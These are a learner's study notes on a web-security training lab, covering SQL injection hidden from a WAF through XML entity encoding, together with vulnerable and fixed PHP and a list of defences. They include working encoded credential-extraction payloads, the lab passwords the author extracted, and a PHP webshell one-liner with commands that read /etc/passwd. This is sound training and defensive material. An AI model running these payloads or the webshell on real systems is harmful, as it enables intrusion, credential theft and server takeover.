# Day 19 Notes — XML Fundamentals and SQLi WAF Bypass via XML Entity Encoding

**Date:** May 2, 2026
**Platform:** PortSwigger Web Security Academy
**Lab Completed:** SQL injection with filter bypass via XML encoding

---

## 1. What We Did Today Overview

- Learned what XML is from scratch — structure, syntax, how it is sent in HTTP requests, and why applications use it
- Learned what XML entities are — predefined entities and numeric character references in both decimal and hexadecimal
- Understood the full WAF bypass mechanic — how encoding travels through WAF, XML parser, and reaches the database decoded
- Confirmed SQLi injection point using arithmetic injection — `1+1` returned different stock units than `1`, confirming the parameter is injectable without triggering the WAF
- Confirmed WAF is blocking plaintext SQL keywords — `UNION SELECT NULL--` returned "Attack detected"
- Bypassed WAF by manually encoding the entire payload character by character into decimal XML entities
- Discovered the query has 2 columns but only 1 displays data — extracted credentials using single column concatenation
- Extracted all three user credentials from the database
- Zero hints used. Payload encoded entirely by hand without using Hackvertor extension.

---

## 2. The Foundation — Why This Vulnerability Exists

### Part A — Root Cause

This vulnerability exists because of a trust gap between two separate layers of the application stack — the WAF and the XML parser. The developer added a WAF to block SQL injection attempts, which was the right instinct. But the WAF operates on raw text pattern matching — it looks for the literal characters `U`, `N`, `I`, `O`, `N` in sequence. It has no understanding of XML encoding or any other encoding scheme.

At the same time the application uses an XML parser to read the request body before extracting values for the database query. The XML parser correctly decodes entity references as part of its job — that is exactly what XML parsers are supposed to do. Neither component is broken in isolation. The vulnerability exists in the gap between them — the WAF scans before decoding happens, the parser decodes after the WAF has already allowed the request through.

The underlying SQLi still exists for the same root reason as every other SQLi covered in this series — user input from the XML body reaches a SQL query through string concatenation without parameterization.

### Part B — The Mental Model

Imagine a nightclub with a bouncer at the door checking IDs. The bouncer has a list of banned names — he turns away anyone whose ID says "UNION" or "SELECT". A clever person gets a fake ID written in a foreign script that the bouncer cannot read. The bouncer sees unfamiliar characters, finds no banned names on the ID, and lets them in. Inside the club there is a translator who reads the foreign script perfectly and announces the person's real name. The person is now inside under their real identity — the bouncer never knew.

The WAF is the bouncer. XML entity encoding is the foreign script. The XML parser is the translator. The database is the inside of the club.

### Part C — Three Conditions Required

For this specific bypass to work three things must be true simultaneously.

First, the application must accept XML in the request body and use an XML parser to extract values — if the application reads XML as raw text without parsing, entities never get decoded and the SQL breaks.

Second, the WAF must scan the raw request body before XML parsing occurs — if the WAF decoded entities before scanning it would see the SQL keywords and block the request.

Third, the extracted XML values must reach a SQL query through string concatenation without parameterization — the same prerequisite as all SQLi. Encoding only bypasses the WAF. The underlying injection still requires unsanitized input reaching the database.

### Part D — What It Can and Cannot Do

This technique **can** bypass WAFs that perform raw text pattern matching without decoding. It **can** be used with any encoding scheme the backend parser decodes — XML entities, URL encoding, Unicode escapes, HTML entities — depending on what the application processes. It **can** extract any data the database user has read access to.

This technique **cannot** bypass WAFs that decode content before scanning — modern enterprise WAFs often do this. It **cannot** fix the underlying SQLi — encoding is a delivery mechanism, not a vulnerability class. It **cannot** work if the application does not use an XML parser, because the entities would reach the database still encoded and the SQL syntax would be broken.

---

## 3. XML Fundamentals

### What XML Is

XML stands for eXtensible Markup Language. It is a format for structuring and transporting data so both humans and machines can read it. It looks similar to HTML because both use angle bracket syntax — but they serve completely different purposes.

HTML defines how content is displayed in a browser. XML defines how data is structured and transported between systems. XML has no predefined tags — you create tag names that describe your own data.

A basic XML document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<person>
    <name>Ainz</name>
    <age>21</age>
    <country>India</country>
</person>
```

The first line is the XML declaration — it tells the parser what version of XML this is and what character encoding the document uses. Every piece of data sits between an opening tag and a closing tag. Tags nest inside each other to create hierarchy. Every XML document must have exactly one root element — here that is `<person>`.

### How XML Gets Sent in an HTTP Request

When a browser submits a form or triggers an action that sends XML, it makes an HTTP POST request with the XML in the request body:

```
POST /product/stock HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

`Content-Type: application/xml` tells the server the body contains XML. The server passes the body through an XML parser which extracts the values from each tag. The `storeId` value `1` is extracted and used in a SQL query. If that SQL query is built through string concatenation — injection is possible.

### What XML Entities Are

XML reserves certain characters for its own syntax. The `<` character means "start of a tag." If your actual data contains a `<` character the XML parser gets confused and breaks. XML provides entity codes — shorthand representations — for these reserved characters:

| Character | Meaning in XML | Safe Entity Code |
|---|---|---|
| `<` | Start of tag | `&lt;` |
| `>` | End of tag | `&gt;` |
| `&` | Start of entity | `&amp;` |
| `"` | Attribute delimiter | `&quot;` |
| `'` | Attribute delimiter | `&apos;` |

Beyond predefined entities, XML supports **numeric character references** — any Unicode character can be represented by its decimal or hexadecimal number:

| Character | Decimal | Hexadecimal |
|---|---|---|
| `U` | `&#85;` | `&#x55;` |
| `N` | `&#78;` | `&#x4E;` |
| `I` | `&#73;` | `&#x49;` |
| `O` | `&#79;` | `&#x4F;` |
| `S` | `&#83;` | `&#x53;` |
| `E` | `&#69;` | `&#x45;` |
| `L` | `&#76;` | `&#x4C;` |
| `C` | `&#67;` | `&#x43;` |
| `T` | `&#84;` | `&#x54;` |
| space | `&#32;` | `&#x20;` |

When the XML parser reads `&#85;` it converts it to `U` before handing the value to the application. The application and database never see the entity code — they see the decoded character.

---

## 4. The WAF Bypass — How It Works End to End

### The Journey of an Encoded Payload

```
Step 1 — Browser sends encoded payload:
<storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#45;&#45;</storeId>

Step 2 — WAF scans raw request body:
Sees: &#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#45;&#45;
Does not find UNION or SELECT as literal strings
Allows request through

Step 3 — XML parser on server decodes entities:
&#49; → 1
&#32; → (space)
&#85;&#78;&#73;&#79;&#78; → UNION
&#32; → (space)
&#83;&#69;&#76;&#69;&#67;&#84; → SELECT
&#32; → (space)
&#78;&#85;&#76;&#76; → NULL
&#45;&#45; → --

Step 4 — Application receives decoded value:
1 UNION SELECT NULL--

Step 5 — Application builds SQL query:
SELECT * FROM products WHERE storeId = '1 UNION SELECT NULL--'

Step 6 — Database executes:
SELECT * FROM products WHERE storeId = 1
UNION SELECT NULL--
```

The WAF saw encoded text. The database executed SQL. The WAF was bypassed entirely without touching the underlying vulnerability.

---

## 5. Lab — SQL Injection with Filter Bypass via XML Encoding

### Setup

Shopping site with a stock check feature. Clicking "Check stock" sends a POST request with an XML body. The `storeId` parameter inside the XML is injectable but protected by a WAF that blocks SQL keywords. Goal is to bypass the WAF using XML entity encoding and extract administrator credentials.

### Step 1 — Confirm WAF Is Blocking SQL Keywords

Modified `storeId` to include a basic UNION payload:

```xml
<storeId>1 UNION SELECT NULL--</storeId>
```

Response: `Attack detected`

WAF confirmed. SQL keywords in plaintext are blocked.

### Step 2 — Confirm Injection Point Without Triggering WAF

Arithmetic injection does not use SQL keywords — the WAF does not block it:

```xml
<storeId>1</storeId>
```
Response: `308 units`

```xml
<storeId>1+1</storeId>
```
Response: `221 units`

The response changed. `1+1` evaluated to `2` inside the SQL query and returned stock for store 2 instead of store 1. This confirms the parameter is injectable — the database is evaluating arithmetic inside the value. The WAF does not block this because there are no SQL keywords.

### Step 3 — Find Column Count Using Encoded Payloads

Encoded `1 UNION SELECT NULL--` manually into decimal entities:

```
&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#45;&#45;
```

Payload in request:
```xml
<storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#45;&#45;</storeId>
```

Response: `308 units` — valid response, no attack detected. WAF bypassed. 1 NULL worked.

Tried 2 NULLs — encoded `1 UNION SELECT NULL,NULL--`:
Response: `0 units` — valid response, no error. 2 columns confirmed.

Tried 3 NULLs — error returned. Confirms exactly 2 columns exist in the query.

**Key finding — column count vs columns that display data:**

The query has 2 columns. But `UNION SELECT NULL,NULL` returned 0 units — both NULLs produced no visible output. When data was placed in column 1 it appeared in the response. Column 2 exists in the query but is never rendered on the page. This means only column 1 displays data. Single column extraction is correct — no NULL placeholder needed in column 2 because it is invisible regardless.

### Step 4 — Extract Credentials Using Concatenation

Encoded `1 UNION SELECT username||'~'||password FROM users--` into decimal entities:

```
&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&#39;&#126;&#39;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#45;&#45;
```

Payload in request:
```xml
<storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&#39;&#126;&#39;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#45;&#45;</storeId>
```

Response:
```
carlos~k1l2lets7dowp8is1jfp
308 units
administrator~iaho9v9i0zikmakqlbml
wiener~hypclpmr72pr0qnxpl21
```

**All credentials extracted:**
- `carlos:k1l2lets7dowp8is1jfp`
- `administrator:iaho9v9i0zikmakqlbml`
- `wiener:hypclpmr72pr0qnxpl21`

Split on `~` — left is username, right is password. Logged in as administrator. Lab solved.

### Why It Worked — Technical Explanation

The vulnerable backend query:

```sql
SELECT name, stock FROM products WHERE storeId = '[STOREID_INPUT]'
```

After XML parsing and injection the database receives:

```sql
SELECT name, stock FROM products WHERE storeId = 1
UNION SELECT username||'~'||password FROM users--
```

The original query returns product stock data. The UNION appends every row from the users table with username and password concatenated into one string separated by `~`. The application renders both result sets — stock data appears alongside the injected credential rows. The WAF never saw `UNION` or `SELECT` as literal strings — only as decimal entity codes.

**Why manual encoding worked identically to Hackvertor:**

Hackvertor automates the same character-by-character decimal entity conversion done manually here. The output is identical. Understanding the manual process means you can perform this bypass in any environment — a terminal, a script, a proxy without extensions — not just inside Burp with Hackvertor installed.

---

## 6. Vulnerable Source Code — Line by Line

The vulnerable backend pattern for an XML-accepting endpoint:

```php
<?php
// Read raw XML body from POST request
$xmlData = file_get_contents('php://input');

// Parse the XML - this decodes all entities
$xml = simplexml_load_string($xmlData);

// Extract storeId value - already decoded by XML parser
$storeId = $xml->storeId;

// VULNERABLE - decoded value goes directly into SQL via concatenation
$query = "SELECT name, stock FROM products WHERE storeId = " . $storeId;
$result = mysqli_query($conn, $query);
?>
```

**Line 3:** `file_get_contents('php://input')` — reads the raw POST body as a string. At this point entity codes are still encoded — `&#85;` has not become `U` yet.

**Line 6:** `simplexml_load_string($xmlData)` — parses the XML string. This is where entity decoding happens. The XML parser converts all `&#XX;` references back to their character equivalents. After this line `$xml->storeId` contains fully decoded text — `1 UNION SELECT NULL--` not the encoded version.

**Line 9:** `$storeId = $xml->storeId` — assigns the decoded value to a variable. This is the value the WAF never saw — it only scanned the encoded version in the raw request body.

**Line 12:** `$query = "SELECT name, stock FROM products WHERE storeId = " . $storeId` — string concatenation drops the decoded SQL directly into the query. No quotes around it, no parameterization. The database receives executable SQL.

**The WAF scans line 3's input. The database executes line 12's output. The WAF and the database never see the same version of the data.**

**The fixed version:**

```php
<?php
$xmlData = file_get_contents('php://input');
$xml = simplexml_load_string($xmlData);

// Cast to integer - storeId should only ever be a number
// Any non-numeric input becomes 0, breaking the injection
$storeId = (int)$xml->storeId;

// Parameterized query - input treated as data, never as SQL
$stmt = mysqli_prepare($conn, "SELECT name, stock FROM products WHERE storeId = ?");
mysqli_bind_param($stmt, "i", $storeId);
mysqli_execute($stmt);
?>
```

---

## 7. What Failed and Why

Nothing failed during the lab. Every payload worked on the first or second attempt. The only deliberate test that returned "Attack detected" was the initial plaintext `UNION SELECT` — which was expected and was the confirmation that the WAF was present and active.

---

## 8. Chain Thinking

```
XML SQLi with WAF Bypass
        ↓
Full Credential Extraction (all users)
        ↓
Admin Panel Access
        ↓
File Upload → PHP Webshell → RCE
        ↓
Full Server Compromise
```

**Ainz's chain thinking from tonight:**

When the response changes with arithmetic injection but SQL keywords are blocked — injection exists behind a WAF. The WAF is doing pattern matching on raw text. Since the application processes XML the backend must use an XML parser — which means XML entity encoding will be decoded after the WAF scans. Encode the entire SQL payload into decimal entities. The WAF sees gibberish and allows it. The XML parser decodes it. The database executes it. Once injection is confirmed through encoded UNION NULL — run the full enumeration chain to extract credentials.

**Severity progression:**

XML SQLi alone with WAF bypass: High — full database read access despite WAF protection.
Chained with admin panel file upload: Critical — RCE on production server, WAF bypassed meaning other defenses may be similarly misconfigured.

**The chain in code:**

```sql
-- Step 1: Confirm injection with arithmetic (no WAF trigger)
<storeId>1+1</storeId>

-- Step 2: Encode UNION payload and bypass WAF
<storeId>[encoded: 1 UNION SELECT username||'~'||password FROM users--]</storeId>

-- Step 3: Extract credentials, log in as admin
-- Step 4: Upload PHP webshell via admin file upload
```

```php
// Webshell uploaded via admin panel
<?php echo shell_exec($_GET["cmd"]); ?>
```

```
-- Step 5: Execute commands
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
```

A WAF that was bypassed for SQLi is likely bypassed for other injection types too — the same encoding technique applies to XSS, command injection, and XXE payloads. One bypass opens multiple attack paths.

---

## 9. Real World Context

WAF bypass via encoding is one of the most consistently documented techniques in real penetration testing engagements. Enterprise applications that rely on WAFs as their primary SQLi defense — rather than parameterized queries — are routinely found vulnerable to encoding bypasses. The WAF provides a false sense of security that sometimes causes development teams to deprioritize fixing the underlying injection.

XML-based injection has been found in real bug bounty programs on API endpoints, stock management systems, and e-commerce platforms that use XML for data interchange between services. The attack surface is growing as more applications expose XML APIs for mobile applications and third-party integrations.

Bug bounty payouts on HackerOne for SQLi with WAF bypass:
- SQLi with WAF bypass demonstrating credential access: $5,000–$15,000
- SQLi chained to RCE with WAF bypass: $15,000–$50,000+

WAF bypass findings are rated higher than standard SQLi because they demonstrate that an existing security control has been defeated — the impact to the organization's perceived security posture is greater.

---

## 10. The Fix

**The vulnerable pattern:**

```php
// WAF scans encoded input - allows it
// XML parser decodes it - SQLi reaches database
$storeId = $xml->storeId;
$query = "SELECT stock FROM products WHERE storeId = " . $storeId;
```

**The fixed pattern:**

```php
// Parameterized query makes encoding irrelevant
// SQL structure is fixed before input ever arrives
// Encoded or decoded - the input is always treated as data
$storeId = (int)$xml->storeId; // Cast to integer first
$stmt = mysqli_prepare($conn, "SELECT stock FROM products WHERE storeId = ?");
mysqli_bind_param($stmt, "i", $storeId);
mysqli_execute($stmt);
```

**Why the fix works:**

Parameterized queries compile the SQL structure before user input is provided. It does not matter whether the input arrives encoded or decoded — the SQL structure is already fixed and the input slot is typed as an integer. `1 UNION SELECT NULL--` decoded from entities and placed into an integer slot becomes `0` or throws a type error — it can never be interpreted as SQL syntax because the compilation phase is already complete.

**Defense in depth:**

First, use parameterized queries or prepared statements for every database interaction — this eliminates the injection regardless of what the WAF does or does not catch.

Second, validate and cast input types strictly — if `storeId` should be an integer, cast it to integer immediately after extraction. Any non-numeric value becomes invalid before reaching the query.

Third, use a WAF that decodes content before scanning — modern WAFs can be configured to decode URL encoding, HTML entities, XML entities, and Unicode escapes before pattern matching. This closes the gap that encoding bypasses exploit.

Fourth, apply least privilege to database accounts — the account querying the products table should not have SELECT access to the users table. Even when injection succeeds, proper database permissions limit what data can be reached.

**What does NOT fix it:**

A WAF alone does not fix SQLi. As demonstrated tonight, WAFs that pattern match on raw text are bypassed by encoding. A WAF is an additional detection and mitigation layer — not a substitute for fixing the underlying query construction.

Removing the XML parser and reading the body as raw text does not fix it either — it only breaks the encoding bypass while leaving the string concatenation vulnerability intact. An attacker sends plaintext SQL and the WAF blocks it — but now the developer believes the WAF is sufficient protection, which it is not.

---

## 11. Key Concepts Summary

| Term | Meaning |
|---|---|
| XML | eXtensible Markup Language — a format for structuring and transporting data using custom tags |
| XML declaration | The first line of an XML document specifying version and character encoding |
| XML parser | Software that reads XML text and converts it into a usable data structure, decoding all entities in the process |
| XML entity | A shorthand code representing a character in XML — predefined entities like `&lt;` or numeric references like `&#83;` |
| Numeric character reference | An XML entity that represents a character by its Unicode number in decimal `&#83;` or hexadecimal `&#x53;` |
| WAF | Web Application Firewall — scans HTTP requests for attack patterns and blocks suspicious ones before they reach the application |
| Pattern matching | How most basic WAFs work — looking for exact sequences of characters like UNION or SELECT in raw request text |
| WAF bypass | A technique that allows malicious input to pass through the WAF undetected by disguising it in a format the WAF does not decode |
| Hackvertor | A Burp Suite extension that automatically encodes selected text into various encoding formats including XML decimal entities |
| Arithmetic injection | Injecting mathematical expressions like `1+1` to confirm SQLi without using SQL keywords that trigger WAFs |
| Column count | The number of columns returned by the original SQL query — must be matched by UNION SELECT for the attack to work |
| Columns that display data | A subset of total columns — some columns exist in the query but are never rendered on the page |
| Concatenation operator | `||` in PostgreSQL and Oracle — joins two strings together into one value |
| Defense in depth | Layering multiple security controls so that bypassing one layer does not result in complete compromise |
| Least privilege | Giving database accounts only the permissions they need — limits damage when injection occurs |

---

## 12. Payloads and Commands Reference

```xml
<!-- CONFIRM WAF IS ACTIVE -->
<!-- Sends plaintext SQL keyword — should return "Attack detected" -->
<storeId>1 UNION SELECT NULL--</storeId>
```

```xml
<!-- CONFIRM INJECTION WITHOUT WAF TRIGGER -->
<!-- Arithmetic injection — no SQL keywords, response change confirms injection -->
<storeId>1</storeId>      <!-- baseline response -->
<storeId>1+1</storeId>    <!-- different response confirms injection -->
```

```xml
<!-- ENCODED PAYLOADS — decimal entity encoding -->

<!-- 1 UNION SELECT NULL-- -->
<storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#45;&#45;</storeId>

<!-- 1 UNION SELECT NULL,NULL-- -->
<storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#44;&#78;&#85;&#76;&#76;&#45;&#45;</storeId>

<!-- 1 UNION SELECT username||'~'||password FROM users-- -->
<storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&#39;&#126;&#39;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#45;&#45;</storeId>
```

```
-- MANUAL ENCODING REFERENCE — decimal entities for common SQL characters
U = &#85;    N = &#78;    I = &#73;    O = &#79;
S = &#83;    E = &#69;    L = &#76;    C = &#67;    T = &#84;
F = &#70;    R = &#82;    M = &#77;    W = &#87;    H = &#72;
space = &#32;    - = &#45;    , = &#44;    | = &#124;    ~ = &#126;
' = &#39;    1 = &#49;    * = &#42;
```

```
-- HACKVERTOR EXTENSION (alternative to manual encoding)
1. In Burp Repeater highlight the SQL payload text only
2. Right click → Extensions → Hackvertor → Encode → dec_entities
3. Hackvertor wraps selection: <@dec_entities>payload</@dec_entities>
4. Burp encodes automatically when request is sent
```

```
-- BURP BAPP STORE — installing Hackvertor
1. Extensions tab in Burp Suite
2. BApp Store
3. Search: Hackvertor
4. Click Install
```

---

## 13. Foundation Checklist

**Can you explain what causes this WAF bypass — not what it is but why it works?**
The bypass works because the WAF and the XML parser operate on different versions of the same data. The WAF scans the raw encoded request body and finds no SQL keywords. The XML parser then decodes the entities as part of normal XML processing. The application uses the decoded value in a SQL query through string concatenation. The WAF and database never see the same string — the WAF sees entity codes, the database sees SQL.

**If you were on a bug bounty target with an XML API and a WAF blocking your SQLi, could you confirm injection without using any SQL keywords?**
Yes. Inject arithmetic into the XML parameter — `<storeId>1+1</storeId>`. If the response changes compared to `<storeId>1</storeId>` — the database is evaluating expressions inside the value, which confirms injection. Arithmetic does not contain SQL keywords and does not trigger keyword-based WAF rules.

**Can you explain to a developer in two minutes why adding a WAF did not fix their SQLi?**
A WAF blocks known attack patterns in raw request text. Encoding converts those patterns into a different representation that the WAF does not recognize. The XML parser then decodes that representation back before the data reaches the database. The WAF never sees SQL — but the database does. The only real fix is parameterized queries — where the SQL structure is compiled before user input is ever provided, making the input impossible to interpret as SQL syntax regardless of encoding or decoding.

**Can you describe two real scenarios where XML SQLi with WAF bypass would be encountered?**
First — an e-commerce platform with a stock management API that accepts XML from mobile applications. The API was secured with a WAF after a previous SQLi finding. An attacker discovers the XML endpoint, confirms arithmetic injection, and encodes a full credential extraction payload. Second — an internal enterprise tool exposed externally that uses XML for its data interchange format. The WAF was added as the primary security control when the tool was promoted from internal to external. XML encoding bypasses the WAF and exposes the internal database.

**Can you chain this vulnerability with one from a previous day and explain the combined impact?**
XML SQLi with WAF bypass extracts admin credentials including the administrator password. Admin access opens the application's admin panel. The admin panel has a file upload feature for managing product images. Using the Content-Type bypass technique from Day 13 a PHP webshell is uploaded as a fake image. The webshell is accessed via URL and shell commands are executed on the server. The result is Remote Code Execution on a production server — starting from a WAF that was supposed to prevent SQLi.

**Can you explain why encoding the payload does not mean the fix is to decode before the WAF scans?**
Decoding before WAF scanning would close this specific bypass — but it introduces a new problem. If the WAF decodes and then scans, an attacker can double-encode — encode once, the WAF decodes and scans the first layer, does not see SQL keywords, allows it through, the XML parser decodes the second layer, SQL reaches the database. The only reliable fix is at the database layer — parameterized queries that treat all input as data regardless of encoding. Fixing the detection layer without fixing the construction layer is always an arms race.

---
